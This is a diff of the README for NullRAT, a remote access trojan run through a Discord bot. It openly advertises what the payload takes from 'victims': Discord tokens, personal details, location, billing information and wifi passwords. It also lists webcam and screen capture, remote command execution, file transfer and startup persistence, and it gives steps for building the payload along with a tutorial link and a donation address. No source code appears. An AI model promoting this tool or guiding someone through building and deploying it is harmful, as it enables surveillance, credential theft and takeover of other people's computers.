@@ -6,57 +6,95 @@
 
 ---
 
-## Announcement:
+
+</br>
+
+
+> # Announcement:
 **04/21/2022**
 
 This project is undergoing a redesign. You might not see a new release in a few months. **NullRAT is not dead**
 
-Not to worry though, [one last release](https://github.com/NullCode1337/NullRAT/releases/tag/v7.5) has been published with a new compiler, to ensure everything is alright
+Not to worry though, [one last release](https://github.com/NullCode1337/NullRAT/releases) has been published with a new compiler, to ensure everything is alright
 
-## Features:
+
+</br>
+
+
+> # Features:
 <details>
 <summary>NullRAT features:</summary>
-<h4>-> Always maintained</br></br>
--> Designed to be very noob friendly with intuitive features:</br>
-&nbsp;&nbsp;&nbsp; - Controlled via slash commands</br>
-&nbsp;&nbsp;&nbsp; - Some commands supported with buttons</br>
-&nbsp;&nbsp;&nbsp; - Etc!</br></br>
--> Supports targeting multiple victims [NEW]!</br>
--> Created with small size in mind! (7MB payload)</h4>
+  
+```diff
++ Always maintained
+  
++ Designed to be very noob friendly with intuitive features:
+    +- Controlled via slash commands
+    +- And some commands supported with buttons
+  
++ Supports targeting multiple victims [NEW]!
+  
++ Created with small size in mind! (7MB payload)
+```
+
 </details>
 
 <details>
 <summary>NullRAT Payload features:</summary>
-<h4>-> Find the public IP Address of the victim</br></br>
--> Find their Discord token(s) and all user info:</br>
-&nbsp;&nbsp;&nbsp; - Username, Tag and ID</br>
-&nbsp;&nbsp;&nbsp; - Email Address </br>
-&nbsp;&nbsp;&nbsp; - Phone Number</br>
-&nbsp;&nbsp;&nbsp; - Nitro Status </br></br>
--> Find victim's geographic information:</br>
-&nbsp;&nbsp;&nbsp; - Country</br>
-&nbsp;&nbsp;&nbsp; - City</br>
-&nbsp;&nbsp;&nbsp; - Region</br>
-&nbsp;&nbsp;&nbsp; - Latitude & longitude</br>
-&nbsp;&nbsp;&nbsp; - Zip Code</br>
-&nbsp;&nbsp;&nbsp; - ISP</br></br>
--> Take pictures using victim's webcam </br>
--> Take screenshot of victim's monitor</br>
--> Download files from victim's PC</br>
--> Upload payloads to victim's PC</br>
--> Get victim's system information</br>
--> Execute CMD/Powershell command </br>
--> Find any environment variables</br>
--> See directory contents, and do other directory manipulation </br>
--> Get victim's clipboard text history</br>
--> Add executable to startup with one command</br>
--> Find their billing information</br>
--> Find their wifi names and passwords</br>
--> Hide or unhide files in their computer</br>
-**) ...and more!</h4>
+  
+```diff
++ Find the public IP Address of the victim
+  
++ Find their Discord token(s) and all user info:
+    - Username, Tag and ID
+    - Email Address 
+    - Phone Number
+    - Nitro Status
+  
++ Find victim's geographic information:
+    - Country
+    - City
+    - Region
+    - Latitude & longitude
+    - Zip Code
+    - ISP
+  
++ Take pictures using victim's webcam 
+  
++ Take screenshot of victim's monitor
+  
++ Download files from victim's PCs
+  
++ Upload payloads to victim's PC
+  
++ Get victim's system information
+  
++ Execute CMD/Powershell command
+  
++ Find any environment variables
+  
++ See directory contents, and do other directory manipulation
+  
++ Get victim's clipboard text history
+  
++ Add executable to startup with one command
+  
++ Find their billing information
+  
++ Find their wifi names and passwords
+  
++ Hide or unhide files in their computer
+  
++ ...and more!
+```
+
 </details>
 
-## How to use:
+
+</br>
+
+
+> # How to use:
 #### Requirements:
 - **Python 3.8+** (Tick "Add to PATH" while installing) [Microsoft Store version of Python **is broken**]
 - **PIP Folder added to path** (the path is `C:\Users\{username}\Appdata\Roaming\Python\{python ver (Example: Python310)}\Scripts`)
@@ -64,27 +102,36 @@ Not to worry though, [one last release](https://github.com/NullCode1337/NullRAT/
 #### Preparation:
 - Create a Discord Bot and [get it's token](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#discord-bot-token)
 - [Create a proper invite link](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#proper-bot-invite-link) and add it to your server
-- Read [Getting Variables.md](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md) and store all the variables in a temporary file (optional)
+- Optionally, store the [Notification ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#channel-id) and [Server ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#server-ids) along with the token for easy access
 
 #### Steps:
 1. Dowload the latest release of NullRAT (git cloning/download zip will no longer work)
 2. Run the Dependencies Installer (which will install NullRAT's dependencies)
-3. Run the Compiler, and input information according to the temporary file. NullRAT payload will be right there!
+3. Run the Variables generator and input the stored information as required
+4. Run the Compiler and provide all your options. NullRAT payload will be right there!
 
 - **Video tutorial:** [https://youtu.be/G8CsgWYiwWI](https://youtu.be/G8CsgWYiwWI)
 - **NullRAT Discord:** [https://discord.com/invite/s9QANySc2q](https://discord.com/invite/s9QANySc2q)
 
-## Donate:
+
+</br>
+
+
+> # Donate:
 <h6 align=center>( <b>Even if you can't donate, it would be great if you starred this project</b> )</br></br>
 ( <b>It just gives me more motivation to work on it and improve it</b> )</h6>
 
 <details>
 <summary>XMR Address</summary>
-<br>
-<b>48ehSGucnMHFir7YYT9eDfDrXZcrRx9PEeFL52tyDRTz3ZYSbQpnzoaXW484TzvEHkDucLiGGa7nAgcVy7gZSbsuHqgL3Er</b>
+  
+</br>48ehSGucnMHFir7YYT9eDfDrXZcrRx9PEeFL52tyDRTz3ZYSbQpnzoaXW484TzvEHkDucLiGGa7nAgcVy7gZSbsuHqgL3Er
 </details>
 
-## Credits:
+
+</br>
+
+
+> # Credits:
 1) Sp00p64 
 2) Buntii
 3) usrDottik
